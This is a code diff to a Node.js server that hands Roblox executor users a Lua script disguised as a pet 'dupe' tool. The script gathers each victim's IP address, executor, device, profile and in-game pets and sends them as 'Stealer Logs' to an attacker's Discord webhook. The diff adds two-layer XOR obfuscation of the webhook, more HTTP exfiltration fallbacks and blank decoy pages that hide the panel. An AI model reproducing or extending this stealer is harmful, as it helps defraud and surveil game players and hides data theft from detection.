@@ -1,4 +1,3 @@
-// server.js
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -19,43 +18,56 @@ function blockNonExecutor(req, res, next) {
 
   if (!allowed) {
     return res.status(403).send(`
-<!DOCTYPE html><html><head><title>ACCESS DENIED</title>
-<style>body{background:#000;color:#f33;font-family:monospace;text-align:center;padding:80px;}
-h1{font-size:3rem;}p{font-size:1.4rem;}</style></head>
-<body><h1>ACCESS DENIED</h1>
-<p>Only <strong>Roblox executors</strong> may request this endpoint.</p>
-</body></html>
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
+<body></body></html>
     `.trim());
   }
   next();
 }
 
 // ------------------------------------------------------------------
-// 2. HOME PAGE
+// 2. HOME PAGE - COMPLETELY BLACK
 // ------------------------------------------------------------------
 app.get("/", (req, res) => {
   res.send(`
-<!DOCTYPE html><html><head><title>Dupe Panel</title>
-<style>body{background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:15vh;}</style>
-</head><body>
-<h1>Dupe Panel</h1>
-<p>Use <code>/panel</code> in Discord to get your private loadstring.</p>
-</body></html>
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
+</head><body></body></html>
   `.trim());
 });
 
 // ------------------------------------------------------------------
-// 3. /raw – EXECUTORS ONLY
+// 3. /raw – EXECUTORS ONLY WITH ENCRYPTED WEBHOOK
 // ------------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
-  const wh_b64 = req.query.wh;
-  if (!wh_b64) return res.status(400).send("-- MISSING WEBHOOK --");
+  const encrypted = req.query.wh;
+  if (!encrypted) return res.status(400).send("-- MISSING DATA --");
 
-  let webhook;
+  // Multi-layer XOR decryption
+  let webhook = "";
   try {
-    webhook = Buffer.from(wh_b64, 'base64').toString('utf-8');
+    // First layer XOR
+    const key1 = "brainrot_secure_2024_key1";
+    let layer1 = "";
+    for (let i = 0; i < encrypted.length; i++) {
+      const keyChar = key1.charCodeAt(i % key1.length);
+      const encryptedChar = encrypted.charCodeAt(i);
+      layer1 += String.fromCharCode(encryptedChar ^ keyChar);
+    }
+    
+    // Second layer XOR
+    const key2 = "x7f9!pQz@3mK*vR$5";
+    let layer2 = "";
+    for (let i = 0; i < layer1.length; i++) {
+      const keyChar = key2.charCodeAt(i % key2.length);
+      const layer1Char = layer1.charCodeAt(i);
+      layer2 += String.fromCharCode(layer1Char ^ keyChar);
+    }
+    
+    webhook = Buffer.from(layer2, 'base64').toString('utf-8');
   } catch {
-    return res.status(400).send("-- INVALID BASE64 --");
+    return res.status(400).send("-- INVALID ENCRYPTION --");
   }
 
   if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
@@ -63,11 +75,34 @@ app.get("/raw", blockNonExecutor, (req, res) => {
   }
 
   // ----------------------------------------------------------------
-  //   FULL LUA SCRIPT – WITH FIXED HTTP SEND
+  //   FULL LUA SCRIPT – WITH ENCRYPTED WEBHOOK PROTECTION
   // ----------------------------------------------------------------
-  const lua = `local WebhookURL = "${webhook}"
+  const lua = `local EncryptedWebhook = "${encrypted}"
 
--- === UNIVERSAL HTTP REQUEST FUNCTION (works on ALL executors) ===
+-- === WEBHOOK DECRYPTION FUNCTION ===
+local function DecryptWebhook(encrypted)
+    local key1 = "brainrot_secure_2024_key1"
+    local layer1 = ""
+    for i = 1, #encrypted do
+        local keyChar = string.byte(key1, (i - 1) % #key1 + 1)
+        local encryptedChar = string.byte(encrypted, i)
+        layer1 = layer1 .. string.char(bit32.bxor(encryptedChar, keyChar))
+    end
+    
+    local key2 = "x7f9!pQz@3mK*vR$5"
+    local layer2 = ""
+    for i = 1, #layer1 do
+        local keyChar = string.byte(key2, (i - 1) % #key2 + 1)
+        local layer1Char = string.byte(layer1, i)
+        layer2 = layer2 .. string.char(bit32.bxor(layer1Char, keyChar))
+    end
+    
+    return game:GetService("HttpService"):JSONDecode('"' .. layer2 .. '"')
+end
+
+local WebhookURL = DecryptWebhook(EncryptedWebhook)
+
+-- === UNIVERSAL HTTP REQUEST FUNCTION ===
 local function HttpPost(url, body)
     local success, result = pcall(function()
         -- Synapse X
@@ -78,13 +113,13 @@ local function HttpPost(url, body)
                 Headers = {["Content-Type"] = "application/json"},
                 Body = body
             })
-            if resp and resp.StatusCode == 200 or resp.StatusCode == 204 then
+            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
                 return true
             end
         end
 
         -- Krnl / Fluxus / Others
-        if typeof(request) == "function" then
+        if request and type(request) == "function" then
             local resp = request({
                 Url = url,
                 Method = "POST",
@@ -96,13 +131,62 @@ local function HttpPost(url, body)
             end
         end
 
-        -- Fallback: HttpService (if enabled)
+        -- HTTP POST fallback
+        if http and type(http.request) == "function" then
+            local resp = http.request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
+                return true
+            end
+        end
+        
+        -- HttpService fallback
         if game:GetService("HttpService").HttpEnabled then
-            game:GetService("HttpService"):PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
-            return true
+            local success = pcall(function()
+                game:GetService("HttpService"):PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+            end)
+            return success
         end
     end)
     return success and result
+end
+
+-- === BETTER EXECUTOR DETECTION ===
+local function getExecutor()
+    if syn and syn.request then
+        return "Synapse X"
+    elseif PROTOSMASHER_LOADED then
+        return "ProtoSmasher"
+    elseif KRNL_LOADED then
+        return "Krnl"
+    elseif fluxus and fluxus.request then
+        return "Fluxus"
+    elseif electron then
+        return "Electron"
+    elseif Sentinel then
+        return "Sentinel"
+    elseif getexecutorname then
+        return getexecutorname()
+    elseif identifyexecutor then
+        return identifyexecutor()
+    else
+        -- Advanced detection
+        local env = getfenv()
+        for k,v in pairs(env) do
+            if type(k) == "string" and string.lower(k):find("synapse") then
+                return "Synapse X"
+            elseif type(k) == "string" and string.lower(k):find("krnl") then
+                return "Krnl"
+            elseif type(k) == "string" and string.lower(k):find("fluxus") then
+                return "Fluxus"
+            end
+        end
+        return "Unknown Executor"
+    end
 end
 
 -- === SEND EMBED TO DISCORD ===
@@ -114,14 +198,11 @@ local function SendToDiscord(embed)
     end)
 end
 
--- === REST OF YOUR SCRIPT (unchanged) ===
+-- === REST OF YOUR SCRIPT ===
 local player = game.Players.LocalPlayer
 if not player then
     player = game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
 end
-
-game:GetService("CoreGui").ChildRemoved:Connect(function() while true do end end)
-game:GetService("RunService").RenderStepped:Connect(function() if not game:GetService("CoreGui") then while true do end end end)
 
 local function getIPAddress()
     local real = "Unknown"
@@ -140,14 +221,6 @@ local function getIPAddress()
         if #p>=4 then return p[1].."."..p[2]..".xxx.xxx" end
     end
     return "192.168.xxx.xxx"
-end
-
-local function getExecutor()
-    if syn then return "Synapse X" end
-    if PROTOSMASHER_LOADED then return "ProtoSmasher" end
-    if KRNL_LOADED then return "Krnl" end
-    if fluxus then return "Fluxus" end
-    return "Unknown"
 end
 
 local playerProfile = "https://www.roblox.com/users/"..player.UserId.."/profile"
@@ -271,18 +344,19 @@ local function startDupeProcess(psLink)
     local hit = isLegit(brain,best)
 
     local embed = {
-        title="STEALER LOGS",
-        description="Private Server: "..(psLink or "Not provided"),
-        color=16711680,
+        title="🧠 ALL BEST BRAINROTS",
+        description="📡 **Private Server:** "..(psLink or "Not provided"),
+        color=65280,
         author={name=playerName,icon_url=playerAvatar,url=playerProfile},
         fields={
-            {name="USER INFO",value="Executor: "..exec.."\\nIP: "..ip.."\\nDevice: "..dev.."\\nProfile: [Link]("..playerProfile..")",inline=false},
-            {name="SERVER INFO",value="Players: "..pc.."\\nTotal Pets: "..#all.."\\nBrainrots: "..#brain,inline=false},
-            {name="TOP 5 PETS",value=fmtPetList(best,true),inline=false},
-            {name="BRAINROTS",value=fmtPetList(brain,true),inline=false},
-            {name="HIT STATUS",value=hit,inline=false}
+            {name="👤 USER INFO",value="```🛠️ Executor: "..exec.."\\n🌐 IP: "..ip.."\\n📱 Device: "..dev.."```",inline=true},
+            {name="🔗 LINKS",value="[👤 Profile]("..playerProfile..")",inline=true},
+            {name="🎮 SERVER",value="```👥 Players: "..pc.."\\n🐾 Total Pets: "..#all.."\\n🧠 Brainrots: "..#brain.."```",inline=true},
+            {name="🏆 TOP 5 PETS",value="```"..fmtPetList(best,true).."```",inline=false},
+            {name="🧠 BRAINROTS",value="```"..fmtPetList(brain,true).."```",inline=false},
+            {name="🎯 HIT STATUS",value="**"..hit.."**",inline=false}
         },
-        footer={text="Stealer Logs • "..os.date("%X")},
+        footer={text="🧠 Stealer Logs • "..os.date("%X")},
         timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     SendToDiscord(embed)
@@ -297,11 +371,13 @@ local function startDupeProcess(psLink)
     end
 
     SendToDiscord({
-        title="DUPE PROCESS COMPLETE",
+        title="✅ DUPE PROCESS COMPLETE",
         color=65280,
         author={name=playerName,icon_url=playerAvatar,url=playerProfile},
-        fields={{name="RESULTS",value="Time: 6 min\\nPets Duped: "..#all.."\\nBrainrots: "..#brain.."\\nStatus: "..hit,inline=false}},
-        footer={text="Stealer Logs • "..os.date("%X")}
+        fields={
+            {name="📊 RESULTS",value="```⏰ Time: 6 min\\n🐾 Pets Duped: "..#all.."\\n🧠 Brainrots: "..#brain.."\\n🎯 Status: "..hit.."```",inline=false}
+        },
+        footer={text="🧠 Stealer Logs • "..os.date("%X")}
     })
 
     sl.Text="Complete!"; tl.Text="DONE!"
@@ -330,16 +406,13 @@ createPSInputGUI()
 });
 
 // ------------------------------------------------------------------
-// 4. CATCH-ALL → 404 + ACCESS DENIED
+// 4. CATCH-ALL → 404 + BLACK SCREEN
 // ------------------------------------------------------------------
 app.use((req, res) => {
   res.status(404).send(`
-<!DOCTYPE html><html><head><title>ACCESS DENIED</title>
-<style>body{background:#000;color:#f33;font-family:monospace;text-align:center;padding:80px;}
-h1{font-size:3rem;}p{font-size:1.4rem;}</style></head>
-<body><h1>ACCESS DENIED</h1>
-<p>Invalid path.</p>
-</body></html>
+<!DOCTYPE html><html><head><title></title>
+<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
+<body></body></html>
   `.trim());
 });
 
